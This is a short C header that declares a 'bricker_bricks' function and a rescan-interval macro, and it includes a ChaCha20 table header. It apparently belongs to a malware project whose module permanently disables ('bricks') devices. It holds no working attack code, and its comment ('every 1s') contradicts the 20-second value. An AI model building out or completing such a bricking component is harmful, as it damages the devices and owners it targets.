#pragma once

#include "../../debug.h"

#include "../../../utils/headers/util.h"
#include "../../../utils/headers/includes.h"
#include "../../../encryption/chacha20_table.h"

#define BRICKER_RESCAN_TIME 20 * 1000 // Rescan every 1s.

void bricker_bricks();
